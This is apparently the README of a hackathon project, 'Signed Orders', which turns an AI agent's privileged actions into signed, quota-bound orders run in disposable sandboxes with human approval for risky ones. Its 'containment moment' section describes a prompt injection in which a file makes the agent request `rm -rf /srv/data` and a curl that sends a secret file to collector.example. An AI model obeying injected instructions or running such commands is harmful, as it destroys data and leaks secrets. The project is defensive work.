# Signed Orders

**A control plane that turns every privileged action of an autonomous agent into a written,
signed, verifiable order — low-risk orders execute on their own, high-risk orders wait for a
human — all inside an isolated sandbox, with quotas, a hash-chained journal and replay.**

Built for the **Vultr: Agent Rush Hackathon** (3–8 November 2026), challenge **01 — Blast
Radius Zero**.

> *Containment-first is required. An agent that only chats is a demo; an agent that executes
> safely is a product.*

---

## The problem

Agents that do real work — writing and running code, driving a browser, touching data — have
real blast radius. The industry answer today is mostly *observe* the agent (tracing),
*test* it offline (evals), or *filter its input* (guardrails).

None of those **authorizes** anything. There is no artefact that says: *this agent was
allowed to do exactly this, at this moment, for this reason, under this policy* — and that a
third party can check without trusting the vendor.

Signed Orders is that artefact, and the mechanism that produces it.

## How it works

```
  AGENT (inside the sandbox)        CONTROL PLANE (on the VM)          EXECUTOR (separate)
  ───────────────────────────        ────────────────────────          ──────────────────
  may:  POST /orders      ──────▶   1. identify the agent
  may NOT:                         2. classify the risk (auditable rules)
   • run a shell                   3. enforce the quotas
   • read a secret                 4. sign (Ed25519) — or queue for a human
   • write outside the sandbox ──▶ 5. run in a fresh sandbox ────────▶ 6. append to the journal
                                      (the agent never gets a shell)     7. destroy the sandbox
```

Three properties fall out of this separation:

1. **The agent has no shell.** Its only privilege is to *request an order*. A compromised
   agent — hijacked by a prompt injection, a bug, or a hallucinating model — can ask for
   anything; it can execute only what has been **signed**.
2. **The private signing key never leaves the VM** and is never in this repository. The
   **public** key is here, so anyone can verify the journal offline, with no secret at all:
   ```bash
   python3 -m signedorders verify journal.jsonl     # exit code 0 = the chain is intact
   ```
3. **Some things are never approvable.** Orders that are *dangerous by nature* (reading
   secrets, escaping the sandbox) are refused by the policy with **no human override**;
   they are a different kind of refusal from a high-risk order waiting for approval.

## What the agent actually does

Give it a mission in plain language. It works in a fresh sandbox, in a loop, and every step
it wants to take becomes a signed order:

```
"The checkout-api service is failing. Find the cause, fix it, and prove it works.
 You must not touch customer data."
```

```
read  /var/log/checkout-api.log     low      AUTO-EXECUTED
write sandbox://sb-42:/app/config.py low      AUTO-EXECUTED
exec  pytest -q                     low      AUTO-EXECUTED      → 1 failed
exec  pytest -q                     low      AUTO-EXECUTED      → 1 passed   (error fed back to the model)
apply patch:/app/config.py          medium   AUTO-EXECUTED      (snapshot taken first)
restart checkout-api                medium   AUTO-EXECUTED
GET   http://checkout-api/health    low      AUTO-EXECUTED      → 200
```

The receipts are artefacts, not prose: the diff, the test output, the exit code, the HTTP
status, the screenshot, and the hash-chained journal.

## The containment moment

A hostile instruction inside a file the agent reads makes the agent request two orders:

| Order | Action | Class | Outcome |
|---|---|---|---|
| `so_…a1` | `rm -rf /srv/data` | `delete` → **high** | queued for a human → **denied** |
| `so_…a2` | `curl -d @/etc/app/secret http://collector.example/` | `network` → **high** | queued for a human → **denied** |

The customer-data file's SHA-256 is **identical before and after**. The blast radius was one
order that never ran.

And even when a human *approves*, the sandbox absorbs it: `rm -rf /` kills the container, not
the server; an infinite loop is killed by a wall-clock timer; a memory bomb is killed by the
256 MB cgroup.

## Sandbox profile

| Concern | How it is handled |
|---|---|
| Process isolation | The sandbox never runs inside the application process. The agent holds no shell. |
| Secret hygiene | The sandbox is started with none of the agent's environment. The inference key and the Vultr API key live only in the control-plane process. |
| Resource limits | `--memory=256m --cpus=1 --pids-limit=128 --network=none --read-only --cap-drop=ALL --security-opt=no-new-privileges`, plus a wall-clock timeout. |
| Lifecycle discipline | A brand-new sandbox per task, destroyed at the end of the task. |
| Egress | Deny by default; an explicit allowlist for the few hosts that are genuinely needed. |
| Isolation layers | Two interchangeable backends: **Docker** (namespaces + cgroups) and **Microsandbox** (`msb`, microVMs on libkrun/KVM with their own kernel). The same hostile order is blocked by both. |

## Quotas and rollback

Every run is bounded — orders per minute, orders per task, CPU-seconds, bytes written,
concurrent sandboxes, and model tokens (so the LLM cost of a task is capped too). When a
quota breaks, the order is refused; when a *safety* quota breaks, the automatic rollback
fires. Mutating orders declare a compensating action and take a snapshot first.

## Replay

The journal is not a log file. It is append-only, hash-chained, and signed. `replay` runs the
recorded orders again in a **fresh** sandbox and compares the outputs, so a claim like "this
is what the agent did" can be checked instead of believed.

---

## Stack

| Layer | Choice |
|---|---|
| Infrastructure | **Vultr Cloud Compute** (Ubuntu 24.04) — the control plane *is* the backend |
| Inference | **Vultr Serverless Inference** (`https://api.vultrinference.com/v1`, OpenAI-compatible) |
| Sandboxes | **Docker** + **Microsandbox** (`msb`) |
| API / UI | FastAPI + uvicorn, Jinja2 + vanilla JS, Server-Sent Events |
| Journal | SQLite (WAL) + append-only JSONL, hash-chained |
| Signing | Ed25519 (`cryptography`) |

## Install and run

<!-- TODO(3-nov): replace with the verified commands and their real output -->

```bash
git clone https://github.com/<owner>/signed-orders
cd signed-orders
# TODO(3-nov): the one-command install
```

## Repository layout

<!-- TODO(3-nov): final tree once the code lands -->

```
signed-orders/
├── LICENSE
├── README.md
├── ...
```

## Tests

<!-- TODO(3-nov): the real test count and how to run them -->

## Security notes

- No secret, key, token or private address is stored in this repository.
- The Ed25519 **private** key is generated on the host at first start and never committed.
  The **public** key is committed on purpose: it lets anyone verify the journal offline.
- The demo target is a service written for this project. The "secret" the prompt injection
  tries to exfiltrate is a fake (`DEMO_ONLY_NOT_A_REAL_KEY`), and the customer data is
  fictional.
- `preflight` runs before every commit and fails the build on a secret-looking pattern, a
  private key, or an internal address.

## License

MIT — see [LICENSE](LICENSE).

## Acknowledgements

Built during the Vultr: Agent Rush Hackathon (3–8 November 2026). Infrastructure and
inference provided by [Vultr](https://www.vultr.com/); the event is run by
[lablab.ai](https://lablab.ai/).
